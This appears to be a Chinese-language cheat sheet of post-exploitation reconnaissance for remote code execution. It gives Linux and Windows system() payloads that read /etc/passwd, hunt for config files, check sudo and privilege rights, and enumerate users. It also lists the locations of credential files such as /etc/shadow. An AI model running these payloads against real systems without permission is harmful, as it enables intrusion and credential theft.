# 代码执行
### Linux 系统常用命令

在Linux中，代码执行（如PHP的`eval`）后，通常会尝试调用 `system()`, `passthru()`, `shell_exec()` 等函数来执行系统命令。

#### 1. 当前目录与文件操作

| 命令              | 作用                 | 示例 (在RCE payload中)                               |
| --------------- | ------------------ | ------------------------------------------------ |
| `pwd`           | **打印当前工作目录**       | `system('pwd');`                                 |
| `ls`            | 列出当前目录文件和目录        | `system('ls -la');`                              |
| `ls -la`        | 列出所有文件（包括隐藏的）及详细信息 | `system('ls -la /var/www');`                     |
| `find`          | 查找文件               | `system('find / -name config.php 2>/dev/null');` |
| `cat`           | 读取文件内容             | `system('cat /etc/passwd');`                     |
| `more` / `less` | 分页读取文件内容           | `system('more /var/log/apache2/access.log');`    |
| `head` / `tail` | 查看文件开头/结尾          | `system('tail -n 20 /var/log/auth.log');`        |
| `file`          | 查看文件类型             | `system('file /usr/bin/bash');`                  |

#### 2. 用户与权限信息

| 命令        | 作用                               | 示例                   |
| --------- | -------------------------------- | -------------------- |
| `whoami`  | **查看当前用户名**                      | `system('whoami');`  |
| `id`      | 查看当前用户身份信息（UID, GID, groups）     | `system('id');`      |
| `groups`  | 查看当前用户所属组                        | `system('groups');`  |
| `sudo -l` | **检查当前用户能否以root身份运行某些命令**（非常重要！） | `system('sudo -l');` |

#### 3. 系统与网络信息

|命令|作用|示例|
|---|---|---|
|`uname -a`|查看系统内核信息|`system('uname -a');`|
|`ifconfig` / `ip a`|查看网络接口和IP地址|`system('ip a');`|
|`netstat`|查看网络连接、路由表、接口统计|`system('netstat -tulpn');`|
|`ps aux` / `ps -ef`|**查看所有正在运行的进程**|`system('ps aux');`|
|`env`|查看环境变量|`system('env');`|
|`history`|查看当前用户的命令历史|`system('history');`|

#### 4. 常用目录（用于寻找Web根目录、配置文件等）

- Web根目录常见位置：
    
    - `/var/www/html/`
        
    - `/usr/local/apache2/htdocs/`
        
    - `/srv/http/`
        
- 配置文件常见位置：
    
    - `/etc/passwd` （用户列表）
        
    - `/etc/shadow` （用户密码哈希，需root权限）
        
    - `/etc/hosts`
        
    - Apache: `/etc/apache2/apache2.conf`, `/etc/httpd/conf/httpd.conf`
        
    - Nginx: `/etc/nginx/nginx.conf`
        
    - MySQL: `/etc/mysql/my.cnf`
        
- 日志文件常见位置：
    
    - Apache: `/var/log/apache2/access.log`, `/var/log/apache2/error.log`
        
    - Nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`

### Windows 系统常用命令

在Windows中，代码执行后通常会调用 `cmd.exe /c` 来执行命令。

#### 1. 当前目录与文件操作

|命令|作用|示例 (在RCE payload中)|
|---|---|---|
|`cd`|**显示当前目录**（注意：直接`cd`无参数即可显示）|`system('cd');`|
|`dir`|列出当前目录文件和目录|`system('dir');`|
|`dir /a`|列出所有文件（包括隐藏的）|`system('dir C:\ /a');`|
|`tree`|以树状图列出目录结构|`system('tree D:');`|
|`type`|读取文件内容（类似Linux的`cat`）|`system('type C:\\Windows\\System32\\drivers\\etc\\hosts');`|
|`more`|分页读取文件内容|`system('more C:\\boot.ini');`|

#### 2. 用户与权限信息

|命令|作用|示例|
|---|---|---|
|`whoami`|**查看当前用户名**|`system('whoami');`|
|`whoami /priv`|**查看当前用户的特权信息**（非常重要！）|`system('whoami /priv');`|
|`whoami /groups`|查看当前用户所在组|`system('whoami /groups');`|
|`net user`|查看所有用户|`system('net user');`|
|`net localgroup administrators`|**查看管理员组有哪些用户**|`system('net localgroup administrators');`|
|`net user <username>`|查看指定用户的详细信息|`system('net user Administrator');`|

#### 3. 系统与网络信息

|命令|作用|示例|
|---|---|---|
|`ver` \| `systeminfo`|查看系统版本 / 查看详细的系统信息|`system('systeminfo');`|
|`ipconfig` / `ipconfig /all`|查看网络配置信息|`system('ipconfig /all');`|
|`netstat`|查看网络连接、路由表、接口统计|`system('netstat -ano');`|
|`tasklist`|**查看所有正在运行的进程**|`system('tasklist');`|
|`schtasks` / `at`|查看计划任务（可用于提权）|`system('schtasks /query /fo LIST /v');`|
|`set`|查看环境变量|`system('set');`|

#### 4. 常用目录（用于寻找Web根目录、配置文件等）

- Web根目录常见位置（取决于Web服务器，如IIS, Apache, Nginx）：
    
    - `C:\inetpub\wwwroot\` （IIS默认路径）
        
    - `C:\xampp\htdocs\` （XAMPP）
        
    - `C:\Program Files (x86)\Apache Group\Apache2\htdocs\`
        
- 系统重要文件：
    
    - `C:\Windows\System32\drivers\etc\hosts`
        
    - `C:\boot.ini` （旧系统）
        
    - `C:\Windows\win.ini`

### RCE利用中的注意事项

1. **绝对路径**：在不确定环境变量的情况下，使用命令的**绝对路径**更可靠。
    
    - Linux: `/bin/ls`, `/usr/bin/whoami`
        
    - Windows: `C:\Windows\System32\whoami.exe`
        
2. **错误输出**：为了payload更干净，通常会重定向错误输出。
    
    - Linux: `command 2>/dev/null` （将错误丢弃）
        
    - Windows: `command 2>nul` （将错误丢弃）
        
3. **编码与引号**：在拼接命令时，注意特殊字符的转义和引号的使用，避免被解析错误。
    
    - 例如，在PHP中：`system('ls -la ' . escapeshellarg($user_input));`
